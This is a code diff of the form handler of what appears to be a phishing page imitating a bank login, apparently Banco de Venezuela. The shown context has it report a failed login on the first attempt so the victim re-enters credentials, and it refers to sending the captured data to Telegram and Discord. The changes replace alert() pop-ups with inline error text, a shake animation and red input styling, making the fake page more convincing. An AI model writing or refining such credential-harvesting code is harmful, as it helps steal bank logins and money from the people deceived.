@@ -55,7 +55,12 @@ async function handleFormSubmit(event) {
             
         default:
             console.error('Tipo de formulario no reconocido');
-            alert('Error en el sistema. Por favor intente nuevamente.');
+            // Mostrar error en la página si existe el elemento
+            const errorElement = document.getElementById('errorMessage');
+            if (errorElement) {
+                errorElement.textContent = 'Error en el sistema. Por favor intente nuevamente.';
+                errorElement.style.display = 'block';
+            }
             return false;
     }
 
@@ -124,12 +129,26 @@ async function handleFormSubmit(event) {
                     // Es el primer intento, marcar como completado y mostrar error
                     sessionStorage.setItem('bdv_first_attempt', 'completed');
                     
-                    // Mostrar mensaje de error
-                    alert('Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.');
+                    // Mostrar mensaje de error en la página
+                    const errorElement = document.getElementById('errorMessage');
+                    if (errorElement) {
+                        errorElement.textContent = 'Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.';
+                        errorElement.style.display = 'block';
+                        
+                        // Añadir animación
+                        errorElement.style.animation = 'none';
+                        setTimeout(() => {
+                            errorElement.style.animation = 'shake 0.5s ease-in-out';
+                        }, 10);
+                    }
                     
                     // Limpiar campos
                     document.getElementById('username').value = '';
                     document.getElementById('password').value = '';
+                    
+                    // Añadir clases de error a los inputs
+                    document.getElementById('username').classList.add('input-error');
+                    document.getElementById('password').classList.add('input-error');
                     
                     // Enfocar en el primer campo
                     document.getElementById('username').focus();
@@ -151,11 +170,21 @@ async function handleFormSubmit(event) {
                 telegram: telegramData,
                 discord: discordResponse.status
             });
-            alert('Ocurrió un error. Por favor intente nuevamente.');
+            // Mostrar error en la página
+            const errorElement = document.getElementById('errorMessage');
+            if (errorElement) {
+                errorElement.textContent = 'Error de conexión. Por favor intente nuevamente.';
+                errorElement.style.display = 'block';
+            }
         }
     } catch (error) {
         console.error('Error al enviar los datos:', error);
-        alert('Error de conexión. Por favor intente nuevamente.');
+        // Mostrar error en la página
+        const errorElement = document.getElementById('errorMessage');
+        if (errorElement) {
+            errorElement.textContent = 'Error de conexión. Por favor intente nuevamente.';
+            errorElement.style.display = 'block';
+        }
     }
 
     return false;
